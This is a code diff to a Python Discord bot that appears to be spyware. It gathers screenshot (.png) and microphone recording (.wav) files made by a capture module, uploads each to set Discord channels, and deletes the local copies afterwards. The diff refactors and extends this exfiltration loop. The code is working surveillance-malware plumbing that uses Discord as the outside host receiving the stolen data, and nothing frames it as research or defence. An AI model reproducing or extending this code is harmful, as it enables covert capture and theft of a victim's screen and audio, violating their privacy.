@@ -1,9 +1,5 @@
-import discord
+import discord, time, os, socket
 from discord.ext import commands
-import os
-import socket
-import time
-import asyncio
 from screen import Screenshot, Microphone
 from dotenv import load_dotenv
 load_dotenv(".env")
@@ -20,37 +16,40 @@ microphone = Microphone()
 screenshot = Screenshot()  
 
 async def sendMic(ctx):
-    mic_path = microphone.name
-    if not mic_path:
-        print("Microphone path is empty.")
-        return
+    for file in os.listdir("files"):
+        if file.endswith(".wav"):
+            mic_path = f"files\\{file}"
 
-    guild = await bot.fetch_guild(guild_id)
-    channel = await guild.fetch_channel(microphone_channel)
+            if not mic_path:
+                print("Microphone path is empty.")
+                return
 
-    with open(mic_path, 'rb') as screenshot_file:
-        await channel.send(file=discord.File(screenshot_file, mic_path))
-        
-    os.remove(mic_path) # COMMENT OUT IF YOU WANT TO KEEP IT
+            guild = await bot.fetch_guild(guild_id)
+            channel = await guild.fetch_channel(microphone_channel)
 
-@bot.command("sendScreen")
+            with open(mic_path, 'rb') as mic_file:
+                await channel.send(file=discord.File(mic_file, mic_path))
+                
+            os.remove(mic_path) # COMMENT OUT IF YOU WANT TO KEEP IT
+            time.sleep(0.1)
+
 async def sendScreen(ctx):
     for file in os.listdir("files"):
-        screenshot_path = file.replace(".wav", "")
-    
-    screenshot_path = screenshot.name
-    if not screenshot_path:
-        print("Screenshot path is empty.")
-        return
+        if file.endswith(".png"):
+            screenshot_path = f"files\\{file}"
 
-    guild = await bot.fetch_guild(guild_id)
-    channel = await guild.fetch_channel(screenshot_channel)
+            if not screenshot_path:
+                print("Screenshot path is empty.")
+                return
 
-    with open(screenshot_path, 'rb') as screenshot_file:
-        await channel.send(file=discord.File(screenshot_file, screenshot_path)) 
+            guild = await bot.fetch_guild(guild_id)
+            channel = await guild.fetch_channel(screenshot_channel)
 
-    screenshot_path = screenshot.name
-    os.remove(screenshot_path) # COMMENT OUT IF YOU WANT TO KEEP IT
+            with open(screenshot_path, 'rb') as screenshot_file:
+                await channel.send(file=discord.File(screenshot_file, screenshot_path)) 
+
+            os.remove(screenshot_path) # COMMENT OUT IF YOU WANT TO KEEP IT
+            time.sleep(0.1)
 
 @bot.event
 async def on_ready():
@@ -68,9 +67,11 @@ async def on_message(message):
         for file in os.listdir("files"):
             if file.endswith(".png"):
                 await sendScreen(ctx=message)
-        
+            
         for file in os.listdir("files"):
             if file.endswith(".wav"):
                 await sendMic(ctx=message)
+
+        time.sleep(0.1)
 
 bot.run(os.getenv("TOKEN"))
